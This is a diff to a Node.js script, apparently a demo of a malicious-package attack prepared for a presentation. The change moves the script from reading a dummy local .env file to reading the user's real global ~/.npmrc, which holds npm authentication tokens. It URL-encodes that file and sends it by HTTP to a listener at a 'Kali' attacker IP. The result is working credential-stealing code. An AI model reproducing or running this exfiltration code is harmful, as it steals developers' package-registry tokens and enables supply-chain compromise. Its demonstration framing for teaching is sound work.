@@ -10,23 +10,27 @@ const systemPayload = JSON.stringify({
   cwd: process.cwd()
 });
 
-const envFile = path.join(process.cwd(), ".env");
+// 1. CHANGE: Point to the global .npmrc file in the home directory instead of local .env
+const npmrcFile = path.join(os.homedir(), ".npmrc");
 
-if (fs.existsSync(envFile)) {
-    const envContent = fs.readFileSync(envFile, "utf8");
-    console.log("👉 Step 1: Reading fake .env content...\n", envContent);
+// 2. CHANGE: Update the checks and read logic for .npmrc
+if (fs.existsSync(npmrcFile)) {
+    const npmrcContent = fs.readFileSync(npmrcFile, "utf8");
+    console.log("👉 Step 1: Reading global .npmrc authentication content...\n", npmrcContent);
     
-    const encodedEnv = encodeURIComponent(envContent);
+    // 3. CHANGE: URL-encode the npmrc text contents
+    const encodedNpmrc = encodeURIComponent(npmrcContent);
     
-    // 🔴 REPLACE 192.168.X.X WITH YOUR KALI LINUX IP ADDRESS
-    const kaliUrl = `http://192.168.142.129:8000/collect?file=${encodedEnv}`; 
+    // Using your exact Kali IP: 192.168.142.129
+    const kaliUrl = `http://192.168.142.129:8000/collect?file=${encodedNpmrc}`; 
     
-    console.log("📡 Step 2: Transmitting payload to Kali listener...");
+    console.log("📡 Step 2: Transmitting token payload to Kali listener...");
     
     const req = http.request(kaliUrl, {
         method: "POST",
         headers: {
             "Content-Type": "application/json",
+            // Correctly matches the length of the system payload data body being sent below
             "Content-Length": Buffer.byteLength(systemPayload)
         }
     }, (res) => {
@@ -48,5 +52,7 @@ if (fs.existsSync(envFile)) {
     }, 1500);
 
 } else {
-    console.log("❌ Demo Error: Create a dummy '.env' file in this directory first!");
+    // 4. CHANGE: Clear error feedback for your presentation setup
+    console.log("❌ Demo Error: Could not find a global '.npmrc' file in the home directory!");
+    console.log(`Expected path: ${npmrcFile}`);
 }
